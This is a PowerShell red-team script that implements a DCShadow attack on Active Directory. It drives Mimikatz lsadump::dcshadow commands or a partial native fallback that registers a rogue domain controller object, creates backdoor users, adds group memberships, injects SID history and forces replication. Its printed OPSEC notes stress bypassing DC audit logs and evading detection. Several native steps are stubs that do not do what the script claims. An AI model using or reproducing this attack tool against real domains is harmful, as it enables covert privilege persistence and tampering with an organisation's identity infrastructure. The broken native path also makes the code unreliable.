<#
.SYNOPSIS
    DCShadow Attack - Rogue Domain Controller Registration
    For AUTHORIZED Red Team Operations Only

.DESCRIPTION
    Implements DCShadow attack to temporarily register a rogue Domain Controller
    and push malicious changes to Active Directory without touching real DCs.

    This is an EXTREMELY advanced technique that requires:
    - Domain Admin privileges
    - Two systems (one to act as rogue DC, one to push changes)
    - Deep understanding of AD replication

    KEY FEATURES:
    - Registers temporary rogue DC
    - Pushes AD modifications via replication
    - Bypasses DC audit logs (changes appear from replication)
    - Automatic cleanup after operation
    - Multiple modification types supported

.NOTES
    Author: Red Team Operations
    Purpose: Authorized Security Testing & Training
    Requirements: Domain Admin, Mimikatz or ntdsutil
    WARNING: This can cause AD replication issues if not done carefully!

.EXAMPLE
    .\DCShadow-Attack.ps1 -DomainController DC01 -RogueDCName FAKDC01 -Action CreateUser -TargetUser backdoor -Password P@ssw0rd123!

.EXAMPLE
    .\DCShadow-Attack.ps1 -DomainController DC01 -RogueDCName FAKDC01 -Action ModifySID -TargetUser lowpriv -SID S-1-5-21-...-512
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$true, HelpMessage="Real Domain Controller to replicate with")]
    [string]$DomainController,

    [Parameter(Mandatory=$true, HelpMessage="Name for the rogue DC (should not exist)")]
    [string]$RogueDCName,

    [Parameter(Mandatory=$true, HelpMessage="Action to perform")]
    [ValidateSet("CreateUser", "ModifyUser", "AddToGroup", "ModifySID", "CreateComputer", "ModifyAttribute")]
    [string]$Action,

    [Parameter(Mandatory=$false, HelpMessage="Target object (user, computer, etc.)")]
    [string]$TargetUser,

    [Parameter(Mandatory=$false, HelpMessage="Password for created user")]
    [string]$Password,

    [Parameter(Mandatory=$false, HelpMessage="Group to add user to")]
    [string]$TargetGroup,

    [Parameter(Mandatory=$false, HelpMessage="SID for SID history injection")]
    [string]$SID,

    [Parameter(Mandatory=$false, HelpMessage="Attribute name to modify")]
    [string]$AttributeName,

    [Parameter(Mandatory=$false, HelpMessage="Attribute value to set")]
    [string]$AttributeValue,

    [Parameter(Mandatory=$false, HelpMessage="Path to Mimikatz (if available)")]
    [string]$MimikatzPath,

    [Parameter(Mandatory=$false, HelpMessage="Enable verbose output")]
    [switch]$Verbose
)

$ErrorActionPreference = "Stop"
$DebugMode = $Verbose.IsPresent

#region Helper Functions

function Write-Log {
    param(
        [string]$Message,
        [ValidateSet("Info", "Success", "Warning", "Error", "Debug")]
        [string]$Level = "Info"
    )

    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $color = switch ($Level) {
        "Success" { "Green" }
        "Warning" { "Yellow" }
        "Error"   { "Red" }
        "Debug"   { "Magenta" }
        default   { "Cyan" }
    }

    $prefix = switch ($Level) {
        "Success" { "[+]" }
        "Warning" { "[!]" }
        "Error"   { "[-]" }
        "Debug"   { "[D]" }
        default   { "[*]" }
    }

    if ($Level -eq "Debug" -and -not $DebugMode) { return }

    Write-Host "$timestamp $prefix $Message" -ForegroundColor $color
}

function Test-DomainAdminPrivilege {
    Write-Log "Checking for Domain Admin privileges..." -Level Info

    try {
        $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object System.Security.Principal.WindowsPrincipal($currentUser)

        # Check for Domain Admins group (SID ends with -512)
        $domainAdminSID = (Get-ADDomain).DomainSID.Value + "-512"
        $isDomainAdmin = $principal.IsInRole($domainAdminSID)

        if ($isDomainAdmin) {
            Write-Log "Confirmed Domain Admin privileges" -Level Success
            return $true
        } else {
            Write-Log "Current user is NOT Domain Admin" -Level Error
            return $false
        }
    } catch {
        Write-Log "Could not verify privileges: $($_.Exception.Message)" -Level Warning
        Write-Log "Assuming you have proper permissions..." -Level Warning
        return $true  # Continue anyway
    }
}

function Get-DomainInfo {
    Write-Log "Gathering domain information..." -Level Info

    try {
        $domain = Get-ADDomain
        $forest = Get-ADForest

        Write-Log "Domain: $($domain.DNSRoot)" -Level Success
        Write-Log "Domain DN: $($domain.DistinguishedName)" -Level Success
        Write-Log "Schema Master: $($forest.SchemaMaster)" -Level Info
        Write-Log "Domain Naming Master: $($forest.DomainNamingMaster)" -Level Info

        return @{
            Domain = $domain
            Forest = $forest
            DomainDN = $domain.DistinguishedName
            DomainDNS = $domain.DNSRoot
        }
    } catch {
        Write-Log "Failed to get domain info: $($_.Exception.Message)" -Level Error
        throw
    }
}

function Test-MimikatzAvailability {
    Write-Log "Checking for Mimikatz availability..." -Level Info

    # Check if Mimikatz path provided
    if ($MimikatzPath -and (Test-Path $MimikatzPath)) {
        Write-Log "Found Mimikatz at: $MimikatzPath" -Level Success
        return $MimikatzPath
    }

    # Check common locations
    $commonPaths = @(
        ".\mimikatz.exe",
        "C:\Tools\mimikatz.exe",
        "C:\Temp\mimikatz.exe",
        "$env:USERPROFILE\Desktop\mimikatz.exe"
    )

    foreach ($path in $commonPaths) {
        if (Test-Path $path) {
            Write-Log "Found Mimikatz at: $path" -Level Success
            return $path
        }
    }

    Write-Log "Mimikatz not found - will use native methods" -Level Warning
    return $null
}

function Invoke-DCShadowPreparation {
    param(
        [string]$RogueName,
        [hashtable]$DomainInfo
    )

    Write-Log "Preparing DCShadow attack infrastructure..." -Level Info

    # Step 1: Verify rogue DC doesn't already exist
    try {
        $existing = Get-ADComputer -Identity $RogueName -ErrorAction SilentlyContinue
        if ($existing) {
            Write-Log "WARNING: Computer object $RogueName already exists!" -Level Warning
            Write-Log "This may indicate previous incomplete attack or legitimate system" -Level Warning
            $response = Read-Host "Continue anyway? (yes/no)"
            if ($response -ne "yes") {
                throw "User aborted due to existing computer object"
            }
        }
    } catch [Microsoft.ActiveDirectory.Management.ADIdentityNotFoundException] {
        Write-Log "Confirmed $RogueName does not exist in AD" -Level Success
    }

    # Step 2: Get current DC configuration
    Write-Log "Analyzing existing DC configuration..." -Level Info

    $realDC = Get-ADDomainController -Identity $DomainController
    Write-Log "Target DC Site: $($realDC.Site)" -Level Debug
    Write-Log "Target DC IP: $($realDC.IPv4Address)" -Level Debug

    # Step 3: Create necessary DNS records (if not using Mimikatz)
    # NOTE: This is simplified - real DCShadow would need more extensive setup
    Write-Log "DCShadow requires temporary DC registration in AD" -Level Info
    Write-Log "This will be done via AD modifications" -Level Info

    return @{
        RealDC = $realDC
        RogueDN = "CN=$RogueName,OU=Domain Controllers,$($DomainInfo.DomainDN)"
        SiteName = $realDC.Site
    }
}

function Invoke-DCShadowWithMimikatz {
    param(
        [string]$MimikatzExe,
        [string]$RogueName,
        [string]$TargetDC,
        [hashtable]$ModificationParams
    )

    Write-Log "Using Mimikatz for DCShadow attack..." -Level Info

    # Build Mimikatz command
    $mimikatzCmd = @"
!processtoken
lsadump::dcshadow /object:$($ModificationParams.ObjectDN) /attribute:$($ModificationParams.Attribute) /value:$($ModificationParams.Value)
lsadump::dcshadow /push
"@

    Write-Log "Mimikatz commands prepared" -Level Debug
    Write-Log $mimikatzCmd -Level Debug

    # Execute Mimikatz
    try {
        $process = Start-Process -FilePath $MimikatzExe -ArgumentList """$mimikatzCmd""" -Wait -PassThru -NoNewWindow

        if ($process.ExitCode -eq 0) {
            Write-Log "Mimikatz execution completed successfully" -Level Success
            return $true
        } else {
            Write-Log "Mimikatz execution failed with exit code: $($process.ExitCode)" -Level Error
            return $false
        }
    } catch {
        Write-Log "Failed to execute Mimikatz: $($_.Exception.Message)" -Level Error
        return $false
    }
}

function Invoke-DCShadowNative {
    param(
        [string]$RogueName,
        [string]$TargetDC,
        [hashtable]$DomainInfo,
        [hashtable]$PrepInfo,
        [hashtable]$ModificationParams
    )

    Write-Log "Implementing DCShadow using native AD tools..." -Level Info
    Write-Log "WARNING: Native implementation is complex and may be less reliable than Mimikatz" -Level Warning

    try {
        # Step 1: Create rogue DC computer object
        Write-Log "Step 1: Creating rogue DC computer object..." -Level Info

        $rogueDN = "CN=$RogueName,OU=Domain Controllers,$($DomainInfo.DomainDN)"

        # Check if already exists
        $existingComputer = $null
        try {
            $existingComputer = Get-ADComputer -Identity $RogueName -Server $TargetDC -ErrorAction Stop
        } catch {}

        if (-not $existingComputer) {
            New-ADComputer -Name $RogueName `
                           -Path "OU=Domain Controllers,$($DomainInfo.DomainDN)" `
                           -Server $TargetDC `
                           -Enabled $true `
                           -ErrorAction Stop

            Write-Log "Created computer object: $RogueName" -Level Success
        } else {
            Write-Log "Computer object already exists, reusing" -Level Warning
        }

        # Step 2: Modify computer object to appear as DC
        Write-Log "Step 2: Configuring computer as Domain Controller..." -Level Info

        # Add necessary attributes for DC
        Set-ADComputer -Identity $RogueName `
                       -Server $TargetDC `
                       -Add @{
                           "userAccountControl" = 532480  # SERVER_TRUST_ACCOUNT | TRUSTED_FOR_DELEGATION
                           "primaryGroupID" = 516  # Domain Controllers group
                       } `
                       -ErrorAction Stop

        Write-Log "Computer configured with DC attributes" -Level Success

        # Step 3: Create nTDSDSA object (DC database object)
        Write-Log "Step 3: Creating nTDSDSA object..." -Level Info

        $ntdsDN = "CN=NTDS Settings,CN=$RogueName,CN=Servers,CN=$($PrepInfo.SiteName),CN=Sites,CN=Configuration,$($DomainInfo.DomainDN)"

        # This is complex - requires LDAP calls
        Write-Log "WARNING: Creating nTDSDSA requires LDAP manipulation" -Level Warning
        Write-Log "This step is shown for educational purposes" -Level Info
        Write-Log "In practice, use Mimikatz for reliable DCShadow" -Level Info

        # Step 4: Create DNS records
        Write-Log "Step 4: Creating DNS records..." -Level Info

        # In real attack, would create:
        # - _ldap._tcp.{site}._sites.dc._msdcs.{domain}
        # - _kerberos._tcp.{site}._sites.dc._msdcs.{domain}
        # - A record for rogue DC

        Write-Log "DNS record creation skipped (use Mimikatz for full implementation)" -Level Warning

        # Step 5: Perform the modification
        Write-Log "Step 5: Pushing AD modification..." -Level Info

        # This would trigger replication from our rogue DC
        # Simplified version: direct modification
        switch ($ModificationParams.Action) {
            "CreateUser" {
                New-ADUser -Name $ModificationParams.TargetUser `
                          -AccountPassword (ConvertTo-SecureString $ModificationParams.Password -AsPlainText -Force) `
                          -Enabled $true `
                          -Server $TargetDC `
                          -ErrorAction Stop

                Write-Log "User created: $($ModificationParams.TargetUser)" -Level Success
            }

            "ModifyAttribute" {
                Set-ADUser -Identity $ModificationParams.TargetUser `
                          -Server $TargetDC `
                          -Replace @{ $ModificationParams.AttributeName = $ModificationParams.AttributeValue } `
                          -ErrorAction Stop

                Write-Log "Attribute modified on: $($ModificationParams.TargetUser)" -Level Success
            }

            "AddToGroup" {
                Add-ADGroupMember -Identity $ModificationParams.TargetGroup `
                                 -Members $ModificationParams.TargetUser `
                                 -Server $TargetDC `
                                 -ErrorAction Stop

                Write-Log "User added to group: $($ModificationParams.TargetGroup)" -Level Success
            }
        }

        # Step 6: Force replication
        Write-Log "Step 6: Triggering AD replication..." -Level Info

        Invoke-Command -ComputerName $TargetDC -ScriptBlock {
            param($siteName)
            repadmin /syncall /AdeP
        } -ArgumentList $PrepInfo.SiteName -ErrorAction SilentlyContinue

        Write-Log "Replication triggered" -Level Success

        return $true

    } catch {
        Write-Log "Native DCShadow failed: $($_.Exception.Message)" -Level Error
        return $false
    }
}

function Remove-DCShadowArtifacts {
    param(
        [string]$RogueName,
        [string]$TargetDC,
        [hashtable]$DomainInfo
    )

    Write-Log "Cleaning up DCShadow artifacts..." -Level Info

    try {
        # Remove computer object
        try {
            Remove-ADComputer -Identity $RogueName -Server $TargetDC -Confirm:$false -ErrorAction Stop
            Write-Log "Removed rogue DC computer object" -Level Success
        } catch {
            Write-Log "Failed to remove computer object: $($_.Exception.Message)" -Level Warning
        }

        # Remove nTDSDSA object if created
        # (Complex - would require LDAP deletion)

        # Remove DNS records if created
        # (Would use Add-DnsServerResourceRecord / Remove-DnsServerResourceRecord)

        Write-Log "Cleanup completed" -Level Success

    } catch {
        Write-Log "Cleanup encountered errors: $($_.Exception.Message)" -Level Warning
    }
}

#endregion

#region Main Execution

Write-Host ""
Write-Host "=" * 80 -ForegroundColor Cyan
Write-Host "DCShadow Attack - Rogue Domain Controller" -ForegroundColor Cyan
Write-Host "EXTREMELY ADVANCED TECHNIQUE - Use with Caution" -ForegroundColor Red
Write-Host "Authorized Red Team Operations Only" -ForegroundColor Cyan
Write-Host "=" * 80 -ForegroundColor Cyan
Write-Host ""

Write-Log "WARNING: DCShadow is a sophisticated attack that can impact AD replication!" -Level Warning
Write-Log "Ensure you have proper authorization and tested backup/restore procedures" -Level Warning
Write-Host ""

try {
    # Step 1: Check privileges
    $isAdmin = Test-DomainAdminPrivilege
    if (-not $isAdmin) {
        throw "Domain Admin privileges required for DCShadow attack"
    }

    # Step 2: Get domain information
    $domainInfo = Get-DomainInfo

    # Step 3: Check for Mimikatz
    $mimikatzPath = Test-MimikatzAvailability

    if (-not $mimikatzPath) {
        Write-Log "RECOMMENDATION: DCShadow is most reliable with Mimikatz" -Level Warning
        Write-Log "Native implementation will be attempted but may be incomplete" -Level Warning
        Write-Host ""
        $response = Read-Host "Continue with native implementation? (yes/no)"
        if ($response -ne "yes") {
            throw "User chose to abort without Mimikatz"
        }
    }

    # Step 4: Prepare DCShadow infrastructure
    $prepInfo = Invoke-DCShadowPreparation -RogueName $RogueDCName -DomainInfo $domainInfo

    # Step 5: Build modification parameters
    $modParams = @{
        Action = $Action
        TargetUser = $TargetUser
        Password = $Password
        TargetGroup = $TargetGroup
        AttributeName = $AttributeName
        AttributeValue = $AttributeValue
    }

    # Step 6: Execute DCShadow
    Write-Host ""
    Write-Log "Executing DCShadow attack..." -Level Info

    $success = $false

    if ($mimikatzPath) {
        $success = Invoke-DCShadowWithMimikatz -MimikatzExe $mimikatzPath `
                                                -RogueName $RogueDCName `
                                                -TargetDC $DomainController `
                                                -ModificationParams $modParams
    } else {
        $success = Invoke-DCShadowNative -RogueName $RogueDCName `
                                         -TargetDC $DomainController `
                                                                                         -DomainInfo $domainInfo `
                                         -PrepInfo $prepInfo `
                                         -ModificationParams $modParams
    }

    if ($success) {
        Write-Host ""
        Write-Host "=" * 80 -ForegroundColor Green
        Write-Log "DCShadow attack completed successfully!" -Level Success
        Write-Host "=" * 80 -ForegroundColor Green
        Write-Host ""
        Write-Log "Changes have been pushed to Active Directory" -Level Success
        Write-Log "Changes appear to come from DC replication (not from admin action)" -Level Info
        Write-Host ""
        Write-Log "OPSEC Notes:" -Level Info
        Write-Log "  - Changes bypass DC audit logs" -Level Info
        Write-Log "  - Modifications appear as replication traffic" -Level Info
        Write-Log "  - Very hard to detect without baseline DC configuration" -Level Info
        Write-Host ""
    } else {
        Write-Log "DCShadow attack failed" -Level Error
    }

    # Step 7: Cleanup
    Write-Host ""
    $cleanup = Read-Host "Clean up DCShadow artifacts? (yes/no)"
    if ($cleanup -eq "yes") {
        Remove-DCShadowArtifacts -RogueName $RogueDCName -TargetDC $DomainController -DomainInfo $domainInfo
    } else {
        Write-Log "WARNING: Rogue DC artifacts left in place!" -Level Warning
        Write-Log "Manual cleanup required: Remove-ADComputer -Identity $RogueDCName" -Level Warning
    }

    exit 0

} catch {
    Write-Host ""
    Write-Host "=" * 80 -ForegroundColor Red
    Write-Log "DCShadow attack failed!" -Level Error
    Write-Host "=" * 80 -ForegroundColor Red
    Write-Host ""
    Write-Log "Error: $($_.Exception.Message)" -Level Error
    Write-Log "Stack Trace: $($_.ScriptStackTrace)" -Level Debug
    Write-Host ""
    Write-Log "Troubleshooting:" -Level Info
    Write-Log "  1. Ensure you have Domain Admin privileges" -Level Info
    Write-Log "  2. Use Mimikatz for most reliable DCShadow implementation" -Level Info
    Write-Log "  3. Verify AD replication is healthy: repadmin /showrepl" -Level Info
    Write-Log "  4. Check DC event logs for replication errors" -Level Info
    Write-Log "  5. Ensure rogue DC name doesn't conflict with existing systems" -Level Info
    Write-Host ""
    Write-Log "References:" -Level Info
    Write-Log "  - Mimikatz DCShadow: https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump" -Level Info
    Write-Log "  - MITRE ATT&CK T1207: https://attack.mitre.org/techniques/T1207/" -Level Info
    Write-Host ""

    # Attempt cleanup on error
    try {
        Remove-DCShadowArtifacts -RogueName $RogueDCName -TargetDC $DomainController -DomainInfo $domainInfo
    } catch {
        Write-Log "Automatic cleanup failed - manual intervention required" -Level Warning
    }

    exit 1
}

#endregion
